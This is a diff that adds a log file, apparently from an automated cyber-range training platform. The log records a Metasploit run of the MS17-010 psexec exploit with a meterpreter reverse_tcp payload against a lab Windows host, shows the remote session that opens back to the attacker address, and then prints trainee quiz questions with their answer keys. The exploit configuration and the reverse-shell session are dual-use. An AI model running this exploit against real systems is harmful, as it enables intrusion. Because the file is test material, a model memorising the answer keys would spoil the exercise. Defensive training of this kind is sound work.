@@ -1,0 +1,34 @@
+2020-05-14 12:28:39,843- attack-thread - INFO - Property Not Found
+2020-05-14 12:28:40,021- attack-thread - INFO - ....................Parsing Scenario....................
+2020-05-14 12:28:40,037- attack-thread - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 2, 'spawn_seperate_session': True, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}]
+2020-05-14 12:28:40,037- attack-thread - INFO - *****************************Check tools status*****************************
+2020-05-14 12:28:40,038- attack-thread - INFO - ['metasploit']
+2020-05-14 12:28:40,039- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-05-14 12:28:40,039- attack-thread - INFO - ************************Updating Session Tactics**********************
+2020-05-14 12:28:40,051- attack-thread - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-05-14 12:28:40,066- attack-thread - INFO - No Exceptions Found
+2020-05-14 12:28:40,247- attack-thread - INFO - post not needed
+2020-05-14 12:28:40,264- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-05-14 12:28:40,264- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-05-14 12:28:40,264- attack-thread - INFO - option not found in payloads
+2020-05-14 12:28:40,294- attack-thread - INFO - cid: 0
+2020-05-14 12:28:40,294- attack-thread - INFO - ....................Executing Exploit......................................
+2020-05-14 12:28:41,378- attack-thread - INFO - {'job_id': 0, 'uuid': 'ekeuqm49'}
+2020-05-14 12:28:41,396- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-05-14 12:28:44,411- attack-thread - INFO - Meterpreter Sessions {'1': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:31822', 'tunnel_peer': '192.168.18.53:57657', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': 'adqc5uth', 'exploit_uuid': 'ekeuqm49', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
+2020-05-14 12:28:44,414- attack-thread - INFO - Meterpreter Session found in list!, with ID = 1
+2020-05-14 12:28:44,414- attack-thread - INFO - ....................Meterpreter Session List...............................
+2020-05-14 12:28:44,417- attack-thread - INFO - {'1': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:31822', 'tunnel_peer': '192.168.18.53:57657', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': 'adqc5uth', 'exploit_uuid': 'ekeuqm49', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
+2020-05-14 12:28:44,417- attack-thread - INFO - ....................Connected Meterpreter Session Id: 1....................
+2020-05-14 12:28:44,420- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-05-14 12:28:44,441- attack-thread - INFO - Appending Generalize questions_answers
+2020-05-14 12:28:44,442- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-05-14 12:28:44,442- attack-thread - INFO - *****************************Questions*****************************
+2020-05-14 12:28:44,442- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Which Payload type is being used? For Example: Reverse_tcp': 'windows/x64/meterpreter/reverse_tcp'}, 'Question_2': {" Which port is responsible for Attacker's entrance?": '80'}, 'Question_3': {' Which Port is responsible for backdoor connection?': '8778'}, 'Question_4': {' What is time of running payload?  ': '11:09'}, 'Question_5': {' Which Type of attack it is?   ': 'RCD'}, 'Question_6': {'What is the source of coming of  malicious software?  ': 'Application'}, 'Question_7': {'Is it Escalate its priviledge? ': 'Yes'}, 'Question_8': {'Is it Persistence? ': 'No'}}
+2020-05-14 12:28:44,442- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-05-14 12:28:44,442- attack-thread - INFO - ['192.168.18.61', 31822, 'windows/x64/meterpreter/reverse_tcp', '80', '8778', '11:09', 'RCD', 'Application', 'Yes', 'No']
+2020-05-14 12:28:44,454- attack-thread - INFO - evaluation id:5ebcf3b1a00d25117dbf6b3b
+2020-05-14 12:28:44,454- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-05-14 12:28:44,505- attack-thread - INFO - TA01_T1190_P1 has been appended in evaluation
+2020-05-14 12:28:44,506- attack-thread - INFO - ******[Scenario-ID: TA01_T1190_P1Tactic: Initial_Access executed]******
+2020-05-14 12:28:44,506- attack-thread - INFO - ....................Destroying Session.....................................
